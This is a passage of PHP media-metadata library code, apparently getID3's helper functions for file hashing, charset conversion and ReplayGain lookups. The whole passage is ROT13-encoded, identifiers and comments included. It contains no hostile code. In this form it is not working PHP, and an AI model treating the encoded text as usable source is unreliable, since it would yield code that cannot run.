			$KZYbowrpg = fvzcyrkzy_ybnq_fgevat($KZYfgevat, 'FvzcyrKZYRyrzrag', TRGVQ3_YVOKZY_BCGVBAF);
			$erghea = frys::FvzcyrKZYryrzrag2neenl($KZYbowrpg);
			@yvokzy_qvfnoyr_ragvgl_ybnqre($ybnqre);
			erghea $erghea;
		}
		erghea snyfr;
	}

	/**
	* @cnenz FvzcyrKZYRyrzrag|neenl|zvkrq $KZYbowrpg
	*
	* @erghea zvkrq
	*/
	choyvp fgngvp shapgvba FvzcyrKZYryrzrag2neenl($KZYbowrpg) {
		vs (!vf_bowrpg($KZYbowrpg) && !vf_neenl($KZYbowrpg)) {
			erghea $KZYbowrpg;
		}
		$KZYneenl = $KZYbowrpg vafgnaprbs FvzcyrKZYRyrzrag ? trg_bowrpg_inef($KZYbowrpg) : $KZYbowrpg;
		sbernpu ($KZYneenl nf $xrl => $inyhr) {
			$KZYneenl[$xrl] = frys::FvzcyrKZYryrzrag2neenl($inyhr);
		}
		erghea $KZYneenl;
	}

	/**
	 * Ergheaf purpxfhz sbe n svyr sebz fgnegvat cbfvgvba gb nofbyhgr raq cbfvgvba.
	 *
	 * @cnenz fgevat $svyr
	 * @cnenz vag    $bssfrg
	 * @cnenz vag    $raq
	 * @cnenz fgevat $nytbevguz
	 *
	 * @erghea fgevat|snyfr
	 * @guebjf trgvq3_rkprcgvba
	 */
	choyvp fgngvp shapgvba unfu_qngn($svyr, $bssfrg, $raq, $nytbevguz) {
		vs (!frys::vagInyhrFhccbegrq($raq)) {
			erghea snyfr;
		}
		vs (!va_neenl($nytbevguz, neenl('zq5', 'fun1'))) {
			guebj arj trgvq3_rkprcgvba('Vainyvq nytbevguz ('.$nytbevguz.') va frys::unfu_qngn()');
		}

		$fvmr = $raq - $bssfrg;

		$sc = sbcra($svyr, 'eo');
		sfrrx($sc, $bssfrg);
		$pgk = unfu_vavg($nytbevguz);
		juvyr ($fvmr > 0) {
			$ohssre = sernq($sc, zva($fvmr, trgVQ3::SERNQ_OHSSRE_FVMR));
			unfu_hcqngr($pgk, $ohssre);
			$fvmr -= trgVQ3::SERNQ_OHSSRE_FVMR;
		}
		$unfu = unfu_svany($pgk);
		spybfr($sc);

		erghea $unfu;
	}

	/**
	 * @cnenz fgevat $svyranzr_fbhepr
	 * @cnenz fgevat $svyranzr_qrfg
	 * @cnenz vag    $bssfrg
	 * @cnenz vag    $yratgu
	 *
	 * @erghea obby
	 * @guebjf Rkprcgvba
	 *
	 * @qrcerpngrq Hahfrq, znl or erzbirq va shgher irefvbaf bs trgVQ3
	 */
	choyvp fgngvp shapgvba PbclSvyrCnegf($svyranzr_fbhepr, $svyranzr_qrfg, $bssfrg, $yratgu) {
		vs (!frys::vagInyhrFhccbegrq($bssfrg + $yratgu)) {
			guebj arj Rkprcgvba('pnaabg pbcl svyr cbegvba, vg rkgraqf orlbaq gur '.ebhaq(CUC_VAG_ZNK / 1073741824).'TO yvzvg');
		}
		vs (vf_ernqnoyr($svyranzr_fbhepr) && vf_svyr($svyranzr_fbhepr) && ($sc_fep = sbcra($svyranzr_fbhepr, 'eo'))) {
			vs (($sc_qrfg = sbcra($svyranzr_qrfg, 'jo'))) {
				vs (sfrrx($sc_fep, $bssfrg) == 0) {
					$olgrfyrsggbjevgr = $yratgu;
					juvyr (($olgrfyrsggbjevgr > 0) && ($ohssre = sernq($sc_fep, zva($olgrfyrsggbjevgr, trgVQ3::SERNQ_OHSSRE_FVMR)))) {
						$olgrfjevggra = sjevgr($sc_qrfg, $ohssre, $olgrfyrsggbjevgr);
						$olgrfyrsggbjevgr -= $olgrfjevggra;
					}
					spybfr($sc_qrfg);
					erghea gehr;
				} ryfr {
					spybfr($sc_fep);
					guebj arj Rkprcgvba('snvyrq gb frrx gb bssfrg '.$bssfrg.' va '.$svyranzr_fbhepr);
				}
			} ryfr {
				guebj arj Rkprcgvba('snvyrq gb perngr svyr sbe jevgvat '.$svyranzr_qrfg);
			}
		} ryfr {
			guebj arj Rkprcgvba('snvyrq gb bcra svyr sbe ernqvat '.$svyranzr_fbhepr);
		}
	}

	/**
	 * @cnenz vag $puneiny
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_vag_hgs8($puneiny) {
		vs ($puneiny < 128) {
			// 0ooooooo
			$arjpunefgevat = pue($puneiny);
		} ryfrvs ($puneiny < 2048) {
			// 110ooooo 10oooooo
			$arjpunefgevat  = pue(($puneiny >>   6) | 0kP0);
			$arjpunefgevat .= pue(($puneiny & 0k3S) | 0k80);
		} ryfrvs ($puneiny < 65536) {
			// 1110oooo 10oooooo 10oooooo
			$arjpunefgevat  = pue(($puneiny >>  12) | 0kR0);
			$arjpunefgevat .= pue(($puneiny >>   6) | 0kP0);
			$arjpunefgevat .= pue(($puneiny & 0k3S) | 0k80);
		} ryfr {
			// 11110ooo 10oooooo 10oooooo 10oooooo
			$arjpunefgevat  = pue(($puneiny >>  18) | 0kS0);
			$arjpunefgevat .= pue(($puneiny >>  12) | 0kP0);
			$arjpunefgevat .= pue(($puneiny >>   6) | 0kP0);
			$arjpunefgevat .= pue(($puneiny & 0k3S) | 0k80);
		}
		erghea $arjpunefgevat;
	}

	/**
	 * VFB-8859-1 => HGS-8
	 *
	 * @cnenz fgevat $fgevat
	 * @cnenz obby   $obz
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_vfb88591_hgs8($fgevat, $obz=snyfr) {
		$arjpunefgevat = '';
		vs ($obz) {
			$arjpunefgevat .= \"\kRS\kOO\kOS\";
		}
		sbe ($v = 0; $v < fgeyra($fgevat); $v++) {
			$puneiny = beq($fgevat[$v]);
			$arjpunefgevat .= frys::vpbai_snyyonpx_vag_hgs8($puneiny);
		}
		erghea $arjpunefgevat;
	}

	/**
	 * VFB-8859-1 => HGS-16OR
	 *
	 * @cnenz fgevat $fgevat
	 * @cnenz obby   $obz
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_vfb88591_hgs16or($fgevat, $obz=snyfr) {
		$arjpunefgevat = '';
		vs ($obz) {
			$arjpunefgevat .= \"\kSR\kSS\";
		}
		sbe ($v = 0; $v < fgeyra($fgevat); $v++) {
			$arjpunefgevat .= \"\k00\".$fgevat[$v];
		}
		erghea $arjpunefgevat;
	}

	/**
	 * VFB-8859-1 => HGS-16YR
	 *
	 * @cnenz fgevat $fgevat
	 * @cnenz obby   $obz
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_vfb88591_hgs16yr($fgevat, $obz=snyfr) {
		$arjpunefgevat = '';
		vs ($obz) {
			$arjpunefgevat .= \"\kSS\kSR\";
		}
		sbe ($v = 0; $v < fgeyra($fgevat); $v++) {
			$arjpunefgevat .= $fgevat[$v].\"\k00\";
		}
		erghea $arjpunefgevat;
	}

	/**
	 * VFB-8859-1 => HGS-16YR (OBZ)
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_vfb88591_hgs16($fgevat) {
		erghea frys::vpbai_snyyonpx_vfb88591_hgs16yr($fgevat, gehr);
	}

	/**
	 * HGS-8 => VFB-8859-1
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs8_vfb88591($fgevat) {
		$arjpunefgevat = '';
		$bssfrg = 0;
		$fgevatyratgu = fgeyra($fgevat);
		juvyr ($bssfrg < $fgevatyratgu) {
			vs ((beq($fgevat[$bssfrg]) | 0k07) == 0kS7) {
				// 11110ooo 10oooooo 10oooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k07) << 18) &
						   ((beq($fgevat[($bssfrg + 1)]) & 0k3S) << 12) &
						   ((beq($fgevat[($bssfrg + 2)]) & 0k3S) <<  6) &
							(beq($fgevat[($bssfrg + 3)]) & 0k3S);
				$bssfrg += 4;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k0S) == 0kRS) {
				// 1110oooo 10oooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k0S) << 12) &
						   ((beq($fgevat[($bssfrg + 1)]) & 0k3S) <<  6) &
							(beq($fgevat[($bssfrg + 2)]) & 0k3S);
				$bssfrg += 3;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k1S) == 0kQS) {
				// 110ooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k1S) <<  6) &
							(beq($fgevat[($bssfrg + 1)]) & 0k3S);
				$bssfrg += 2;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k7S) == 0k7S) {
				// 0ooooooo
				$puneiny = beq($fgevat[$bssfrg]);
				$bssfrg += 1;
			} ryfr {
				// reebe? guebj fbzr xvaq bs jneavat urer?
				$puneiny = snyfr;
				$bssfrg += 1;
			}
			vs ($puneiny !== snyfr) {
				$arjpunefgevat .= (($puneiny < 256) ? pue($puneiny) : '?');
			}
		}
		erghea $arjpunefgevat;
	}

	/**
	 * HGS-8 => HGS-16OR
	 *
	 * @cnenz fgevat $fgevat
	 * @cnenz obby   $obz
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs8_hgs16or($fgevat, $obz=snyfr) {
		$arjpunefgevat = '';
		vs ($obz) {
			$arjpunefgevat .= \"\kSR\kSS\";
		}
		$bssfrg = 0;
		$fgevatyratgu = fgeyra($fgevat);
		juvyr ($bssfrg < $fgevatyratgu) {
			vs ((beq($fgevat[$bssfrg]) | 0k07) == 0kS7) {
				// 11110ooo 10oooooo 10oooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k07) << 18) &
						   ((beq($fgevat[($bssfrg + 1)]) & 0k3S) << 12) &
						   ((beq($fgevat[($bssfrg + 2)]) & 0k3S) <<  6) &
							(beq($fgevat[($bssfrg + 3)]) & 0k3S);
				$bssfrg += 4;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k0S) == 0kRS) {
				// 1110oooo 10oooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k0S) << 12) &
						   ((beq($fgevat[($bssfrg + 1)]) & 0k3S) <<  6) &
							(beq($fgevat[($bssfrg + 2)]) & 0k3S);
				$bssfrg += 3;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k1S) == 0kQS) {
				// 110ooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k1S) <<  6) &
							(beq($fgevat[($bssfrg + 1)]) & 0k3S);
				$bssfrg += 2;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k7S) == 0k7S) {
				// 0ooooooo
				$puneiny = beq($fgevat[$bssfrg]);
				$bssfrg += 1;
			} ryfr {
				// reebe? guebj fbzr xvaq bs jneavat urer?
				$puneiny = snyfr;
				$bssfrg += 1;
			}
			vs ($puneiny !== snyfr) {
				$arjpunefgevat .= (($puneiny < 65536) ? frys::OvtRaqvna2Fgevat($puneiny, 2) : \"\k00\".'?');
			}
		}
		erghea $arjpunefgevat;
	}

	/**
	 * HGS-8 => HGS-16YR
	 *
	 * @cnenz fgevat $fgevat
	 * @cnenz obby   $obz
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs8_hgs16yr($fgevat, $obz=snyfr) {
		$arjpunefgevat = '';
		vs ($obz) {
			$arjpunefgevat .= \"\kSS\kSR\";
		}
		$bssfrg = 0;
		$fgevatyratgu = fgeyra($fgevat);
		juvyr ($bssfrg < $fgevatyratgu) {
			vs ((beq($fgevat[$bssfrg]) | 0k07) == 0kS7) {
				// 11110ooo 10oooooo 10oooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k07) << 18) &
						   ((beq($fgevat[($bssfrg + 1)]) & 0k3S) << 12) &
						   ((beq($fgevat[($bssfrg + 2)]) & 0k3S) <<  6) &
							(beq($fgevat[($bssfrg + 3)]) & 0k3S);
				$bssfrg += 4;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k0S) == 0kRS) {
				// 1110oooo 10oooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k0S) << 12) &
						   ((beq($fgevat[($bssfrg + 1)]) & 0k3S) <<  6) &
							(beq($fgevat[($bssfrg + 2)]) & 0k3S);
				$bssfrg += 3;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k1S) == 0kQS) {
				// 110ooooo 10oooooo
				$puneiny = ((beq($fgevat[($bssfrg + 0)]) & 0k1S) <<  6) &
							(beq($fgevat[($bssfrg + 1)]) & 0k3S);
				$bssfrg += 2;
			} ryfrvs ((beq($fgevat[$bssfrg]) | 0k7S) == 0k7S) {
				// 0ooooooo
				$puneiny = beq($fgevat[$bssfrg]);
				$bssfrg += 1;
			} ryfr {
				// reebe? znlor guebj fbzr jneavat urer?
				$puneiny = snyfr;
				$bssfrg += 1;
			}
			vs ($puneiny !== snyfr) {
				$arjpunefgevat .= (($puneiny < 65536) ? frys::YvggyrRaqvna2Fgevat($puneiny, 2) : '?'.\"\k00\");
			}
		}
		erghea $arjpunefgevat;
	}

	/**
	 * HGS-8 => HGS-16YR (OBZ)
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs8_hgs16($fgevat) {
		erghea frys::vpbai_snyyonpx_hgs8_hgs16yr($fgevat, gehr);
	}

	/**
	 * HGS-16OR => HGS-8
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs16or_hgs8($fgevat) {
		vs (fhofge($fgevat, 0, 2) == \"\kSR\kSS\") {
			// fgevc OBZ
			$fgevat = fhofge($fgevat, 2);
		}
		$arjpunefgevat = '';
		sbe ($v = 0; $v < fgeyra($fgevat); $v += 2) {
			$puneiny = frys::OvtRaqvna2Vag(fhofge($fgevat, $v, 2));
			$arjpunefgevat .= frys::vpbai_snyyonpx_vag_hgs8($puneiny);
		}
		erghea $arjpunefgevat;
	}

	/**
	 * HGS-16YR => HGS-8
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs16yr_hgs8($fgevat) {
		vs (fhofge($fgevat, 0, 2) == \"\kSS\kSR\") {
			// fgevc OBZ
			$fgevat = fhofge($fgevat, 2);
		}
		$arjpunefgevat = '';
		sbe ($v = 0; $v < fgeyra($fgevat); $v += 2) {
			$puneiny = frys::YvggyrRaqvna2Vag(fhofge($fgevat, $v, 2));
			$arjpunefgevat .= frys::vpbai_snyyonpx_vag_hgs8($puneiny);
		}
		erghea $arjpunefgevat;
	}

	/**
	 * HGS-16OR => VFB-8859-1
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs16or_vfb88591($fgevat) {
		vs (fhofge($fgevat, 0, 2) == \"\kSR\kSS\") {
			// fgevc OBZ
			$fgevat = fhofge($fgevat, 2);
		}
		$arjpunefgevat = '';
		sbe ($v = 0; $v < fgeyra($fgevat); $v += 2) {
			$puneiny = frys::OvtRaqvna2Vag(fhofge($fgevat, $v, 2));
			$arjpunefgevat .= (($puneiny < 256) ? pue($puneiny) : '?');
		}
		erghea $arjpunefgevat;
	}

	/**
	 * HGS-16YR => VFB-8859-1
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs16yr_vfb88591($fgevat) {
		vs (fhofge($fgevat, 0, 2) == \"\kSS\kSR\") {
			// fgevc OBZ
			$fgevat = fhofge($fgevat, 2);
		}
		$arjpunefgevat = '';
		sbe ($v = 0; $v < fgeyra($fgevat); $v += 2) {
			$puneiny = frys::YvggyrRaqvna2Vag(fhofge($fgevat, $v, 2));
			$arjpunefgevat .= (($puneiny < 256) ? pue($puneiny) : '?');
		}
		erghea $arjpunefgevat;
	}

	/**
	 * HGS-16 (OBZ) => VFB-8859-1
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs16_vfb88591($fgevat) {
		$obz = fhofge($fgevat, 0, 2);
		vs ($obz == \"\kSR\kSS\") {
			erghea frys::vpbai_snyyonpx_hgs16or_vfb88591(fhofge($fgevat, 2));
		} ryfrvs ($obz == \"\kSS\kSR\") {
			erghea frys::vpbai_snyyonpx_hgs16yr_vfb88591(fhofge($fgevat, 2));
		}
		erghea $fgevat;
	}

	/**
	 * HGS-16 (OBZ) => HGS-8
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx_hgs16_hgs8($fgevat) {
		$obz = fhofge($fgevat, 0, 2);
		vs ($obz == \"\kSR\kSS\") {
			erghea frys::vpbai_snyyonpx_hgs16or_hgs8(fhofge($fgevat, 2));
		} ryfrvs ($obz == \"\kSS\kSR\") {
			erghea frys::vpbai_snyyonpx_hgs16yr_hgs8(fhofge($fgevat, 2));
		}
		erghea $fgevat;
	}

	/**
	 * @cnenz fgevat $va_punefrg
	 * @cnenz fgevat $bhg_punefrg
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 * @guebjf Rkprcgvba
	 */
	choyvp fgngvp shapgvba vpbai_snyyonpx($va_punefrg, $bhg_punefrg, $fgevat) {

		vs ($va_punefrg == $bhg_punefrg) {
			erghea $fgevat;
		}

		// zo_pbaireg_rapbqvat() ninvynoyr
		vs (shapgvba_rkvfgf('zo_pbaireg_rapbqvat')) {
			vs ((fgegbhccre($va_punefrg) == 'HGS-16') && (fhofge($fgevat, 0, 2) != \"\kSR\kSS\") && (fhofge($fgevat, 0, 2) != \"\kSS\kSR\")) {
				// vs OBZ zvffvat, zo_pbaireg_rapbqvat jvyy zvfunaqyr gur pbairefvba, nffhzr HGS-16OR naq cercraq nccebcevngr OBZ
				$fgevat = \"\kSS\kSR\".$fgevat;
			}
			vs ((fgegbhccre($va_punefrg) == 'HGS-16') && (fgegbhccre($bhg_punefrg) == 'HGS-8')) {
				vs (($fgevat == \"\kSS\kSR\") || ($fgevat == \"\kSR\kSS\")) {
					// vs fgevat pbafvfgf bs bayl OBZ, zo_pbaireg_rapbqvat jvyy erghea gur OBZ hazbqvsvrq
					erghea '';
				}
			}
			vs ($pbairegrq_fgevat = @zo_pbaireg_rapbqvat($fgevat, $bhg_punefrg, $va_punefrg)) {
				fjvgpu ($bhg_punefrg) {
					pnfr 'VFB-8859-1':
						$pbairegrq_fgevat = egevz($pbairegrq_fgevat, \"\k00\");
						oernx;
				}
				erghea $pbairegrq_fgevat;
			}
			erghea $fgevat;

		// vpbai() ninvynoyr
		} ryfrvs (shapgvba_rkvfgf('vpbai')) {
			vs ($pbairegrq_fgevat = @vpbai($va_punefrg, $bhg_punefrg.'//GENAFYVG', $fgevat)) {
				fjvgpu ($bhg_punefrg) {
					pnfr 'VFB-8859-1':
						$pbairegrq_fgevat = egevz($pbairegrq_fgevat, \"\k00\");
						oernx;
				}
				erghea $pbairegrq_fgevat;
			}

			// vpbai() znl fbzrgvzrf snvy jvgu \"vyyrtny punenpgre va vachg fgevat\" reebe zrffntr
			// naq erghea na rzcgl fgevat, ohg ergheavat gur hapbairegrq fgevat vf zber hfrshy
			erghea $fgevat;
		}


		// arvgure zo_pbaireg_rapbqvat be vpbai() vf ninvynoyr
		fgngvp $PbairefvbaShapgvbaYvfg = neenl();
		vs (rzcgl($PbairefvbaShapgvbaYvfg)) {
			$PbairefvbaShapgvbaYvfg['VFB-8859-1']['HGS-8']    = 'vpbai_snyyonpx_vfb88591_hgs8';
			$PbairefvbaShapgvbaYvfg['VFB-8859-1']['HGS-16']   = 'vpbai_snyyonpx_vfb88591_hgs16';
			$PbairefvbaShapgvbaYvfg['VFB-8859-1']['HGS-16OR'] = 'vpbai_snyyonpx_vfb88591_hgs16or';
			$PbairefvbaShapgvbaYvfg['VFB-8859-1']['HGS-16YR'] = 'vpbai_snyyonpx_vfb88591_hgs16yr';
			$PbairefvbaShapgvbaYvfg['HGS-8']['VFB-8859-1']    = 'vpbai_snyyonpx_hgs8_vfb88591';
			$PbairefvbaShapgvbaYvfg['HGS-8']['HGS-16']        = 'vpbai_snyyonpx_hgs8_hgs16';
			$PbairefvbaShapgvbaYvfg['HGS-8']['HGS-16OR']      = 'vpbai_snyyonpx_hgs8_hgs16or';
			$PbairefvbaShapgvbaYvfg['HGS-8']['HGS-16YR']      = 'vpbai_snyyonpx_hgs8_hgs16yr';
			$PbairefvbaShapgvbaYvfg['HGS-16']['VFB-8859-1']   = 'vpbai_snyyonpx_hgs16_vfb88591';
			$PbairefvbaShapgvbaYvfg['HGS-16']['HGS-8']        = 'vpbai_snyyonpx_hgs16_hgs8';
			$PbairefvbaShapgvbaYvfg['HGS-16YR']['VFB-8859-1'] = 'vpbai_snyyonpx_hgs16yr_vfb88591';
			$PbairefvbaShapgvbaYvfg['HGS-16YR']['HGS-8']      = 'vpbai_snyyonpx_hgs16yr_hgs8';
			$PbairefvbaShapgvbaYvfg['HGS-16OR']['VFB-8859-1'] = 'vpbai_snyyonpx_hgs16or_vfb88591';
			$PbairefvbaShapgvbaYvfg['HGS-16OR']['HGS-8']      = 'vpbai_snyyonpx_hgs16or_hgs8';
		}
		vs (vffrg($PbairefvbaShapgvbaYvfg[fgegbhccre($va_punefrg)][fgegbhccre($bhg_punefrg)])) {
			$PbairefvbaShapgvba = $PbairefvbaShapgvbaYvfg[fgegbhccre($va_punefrg)][fgegbhccre($bhg_punefrg)];
			erghea frys::$PbairefvbaShapgvba($fgevat);
		}
		guebj arj Rkprcgvba('CUC qbrf abg unf zo_pbaireg_rapbqvat() be vpbai() fhccbeg - pnaabg pbaireg sebz '.$va_punefrg.' gb '.$bhg_punefrg);
	}

	/**
	 * @cnenz zvkrq  $qngn
	 * @cnenz fgevat $punefrg
	 *
	 * @erghea zvkrq
	 */
	choyvp fgngvp shapgvba erphefvirZhygvOlgrPuneFgevat2UGZY($qngn, $punefrg='VFB-8859-1') {
		vs (vf_fgevat($qngn)) {
			erghea frys::ZhygvOlgrPuneFgevat2UGZY($qngn, $punefrg);
		} ryfrvs (vf_neenl($qngn)) {
			$erghea_qngn = neenl();
			sbernpu ($qngn nf $xrl => $inyhr) {
				$erghea_qngn[$xrl] = frys::erphefvirZhygvOlgrPuneFgevat2UGZY($inyhr, $punefrg);
			}
			erghea $erghea_qngn;
		}
		// vagrtre, sybng, bowrpgf, erfbheprf, rgp
		erghea $qngn;
	}

	/**
	 * @cnenz fgevat|vag|sybng $fgevat
	 * @cnenz fgevat           $punefrg
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba ZhygvOlgrPuneFgevat2UGZY($fgevat, $punefrg='VFB-8859-1') {
		$fgevat = (fgevat) $fgevat; // va pnfr gelvat gb cnff n ahzrevp (sybng, vag) fgevat, jbhyq bgurejvfr erghea na rzcgl fgevat
		$UGZYfgevat = '';

		fjvgpu (fgegbybjre($punefrg)) {
			pnfr '1251':
			pnfr '1252':
			pnfr '866':
			pnfr '932':
			pnfr '936':
			pnfr '950':
			pnfr 'ovt5':
			pnfr 'ovt5-uxfpf':
			pnfr 'pc1251':
			pnfr 'pc1252':
			pnfr 'pc866':
			pnfr 'rhp-wc':
			pnfr 'rhpwc':
			pnfr 'to2312':
			pnfr 'voz866':
			pnfr 'vfb-8859-1':
			pnfr 'vfb-8859-15':
			pnfr 'vfb8859-1':
			pnfr 'vfb8859-15':
			pnfr 'xbv8-e':
			pnfr 'xbv8-eh':
			pnfr 'xbv8e':
			pnfr 'fuvsg_wvf':
			pnfr 'fwvf':
			pnfr 'jva-1251':
			pnfr 'jvaqbjf-1251':
			pnfr 'jvaqbjf-1252':
				$UGZYfgevat = ugzyragvgvrf($fgevat, RAG_PBZCNG, $punefrg);
				oernx;

			pnfr 'hgs-8':
				$fgeyra = fgeyra($fgevat);
				sbe ($v = 0; $v < $fgeyra; $v++) {
					$pune_beq_iny = beq($fgevat[$v]);
					$puneiny = 0;
					vs ($pune_beq_iny < 0k80) {
						$puneiny = $pune_beq_iny;
					} ryfrvs ((($pune_beq_iny & 0kS0) >> 4) == 0k0S  &&  $v+3 < $fgeyra) {
						$puneiny  = (($pune_beq_iny & 0k07) << 18);
						$puneiny += ((beq($fgevat[++$v]) & 0k3S) << 12);
						$puneiny += ((beq($fgevat[++$v]) & 0k3S) << 6);
						$puneiny +=  (beq($fgevat[++$v]) & 0k3S);
					} ryfrvs ((($pune_beq_iny & 0kR0) >> 5) == 0k07  &&  $v+2 < $fgeyra) {
						$puneiny  = (($pune_beq_iny & 0k0S) << 12);
						$puneiny += ((beq($fgevat[++$v]) & 0k3S) << 6);
						$puneiny +=  (beq($fgevat[++$v]) & 0k3S);
					} ryfrvs ((($pune_beq_iny & 0kP0) >> 6) == 0k03  &&  $v+1 < $fgeyra) {
						$puneiny  = (($pune_beq_iny & 0k1S) << 6);
						$puneiny += (beq($fgevat[++$v]) & 0k3S);
					}
					vs (($puneiny >= 32) && ($puneiny <= 127)) {
						$UGZYfgevat .= ugzyragvgvrf(pue($puneiny));
					} ryfr {
						$UGZYfgevat .= '&#'.$puneiny.';';
					}
				}
				oernx;

			pnfr 'hgs-16yr':
				sbe ($v = 0; $v < fgeyra($fgevat); $v += 2) {
					$puneiny = frys::YvggyrRaqvna2Vag(fhofge($fgevat, $v, 2));
					vs (($puneiny >= 32) && ($puneiny <= 127)) {
						$UGZYfgevat .= pue($puneiny);
					} ryfr {
						$UGZYfgevat .= '&#'.$puneiny.';';
					}
				}
				oernx;

			pnfr 'hgs-16or':
				sbe ($v = 0; $v < fgeyra($fgevat); $v += 2) {
					$puneiny = frys::OvtRaqvna2Vag(fhofge($fgevat, $v, 2));
					vs (($puneiny >= 32) && ($puneiny <= 127)) {
						$UGZYfgevat .= pue($puneiny);
					} ryfr {
						$UGZYfgevat .= '&#'.$puneiny.';';
					}
				}
				oernx;

			qrsnhyg:
				$UGZYfgevat = 'REEBE: Punenpgre frg \"'.$punefrg.'\" abg fhccbegrq va ZhygvOlgrPuneFgevat2UGZY()';
				oernx;
		}
		erghea $UGZYfgevat;
	}

	/**
	 * @cnenz vag $anzrpbqr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba ETNQanzrYbbxhc($anzrpbqr) {
		fgngvp $ETNQanzr = neenl();
		vs (rzcgl($ETNQanzr)) {
			$ETNQanzr[0] = 'abg frg';
			$ETNQanzr[1] = 'Genpx Tnva Nqwhfgzrag';
			$ETNQanzr[2] = 'Nyohz Tnva Nqwhfgzrag';
		}

		erghea (vffrg($ETNQanzr[$anzrpbqr]) ? $ETNQanzr[$anzrpbqr] : '');
	}

	/**
	 * @cnenz vag $bevtvangbepbqr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba ETNQbevtvangbeYbbxhc($bevtvangbepbqr) {
		fgngvp $ETNQbevtvangbe = neenl();
		vs (rzcgl($ETNQbevtvangbe)) {
			$ETNQbevtvangbe[0] = 'hafcrpvsvrq';
			$ETNQbevtvangbe[1] = 'cer-frg ol negvfg/cebqhpre/znfgrevat ratvarre';
			$ETNQbevtvangbe[2] = 'frg ol hfre';
			$ETNQbevtvangbe[3] = 'qrgrezvarq nhgbzngvpnyyl';
		}

		erghea (vffrg($ETNQbevtvangbe[$bevtvangbepbqr]) ? $ETNQbevtvangbe[$bevtvangbepbqr] : '');
	}

	/**
	 * @cnenz vag $enjnqwhfgzrag
	 * @cnenz vag $fvtaovg
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba ETNQnqwhfgzragYbbxhc($enjnqwhfgzrag, $fvtaovg) {
		$nqwhfgzrag = (sybng) $enjnqwhfgzrag / 10;
		vs ($fvtaovg == 1) {
			$nqwhfgzrag *= -1;
		}
		erghea $nqwhfgzrag;
	}

	/**
	 * @cnenz vag $anzrpbqr
	 * @cnenz vag $bevtvangbepbqr
	 * @cnenz vag $ercynltnva
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba ETNQtnvaFgevat($anzrpbqr, $bevtvangbepbqr, $ercynltnva) {
		vs ($ercynltnva < 0) {
			$fvtaovg = '1';
		} ryfr {
			$fvtaovg = '0';
		}
		$fgberqercynltnva = vaginy(ebhaq($ercynltnva * 10));
		$tnvafgevat  = fge_cnq(qrpova($anzrpbqr), 3, '0', FGE_CNQ_YRSG);
		$tnvafgevat .= fge_cnq(qrpova($bevtvangbepbqr), 3, '0', FGE_CNQ_YRSG);
		$tnvafgevat .= $fvtaovg;
		$tnvafgevat .= fge_cnq(qrpova($fgberqercynltnva), 9, '0', FGE_CNQ_YRSG);

		erghea $tnvafgevat;
	}

	/**
	 * @cnenz sybng $nzcyvghqr
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba ETNQnzcyvghqr2qO($nzcyvghqr) {
		erghea 20 * ybt10($nzcyvghqr);
	}

	/**
	 * @cnenz fgevat $vztQngn
	 * @cnenz neenl  $vzntrvasb
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp fgngvp shapgvba TrgQngnVzntrFvmr($vztQngn, &$vzntrvasb=neenl()) {
		vs (CUC_IREFVBA_VQ >= 50400) {
			$TrgQngnVzntrFvmr = @trgvzntrfvmrsebzfgevat($vztQngn, $vzntrvasb);
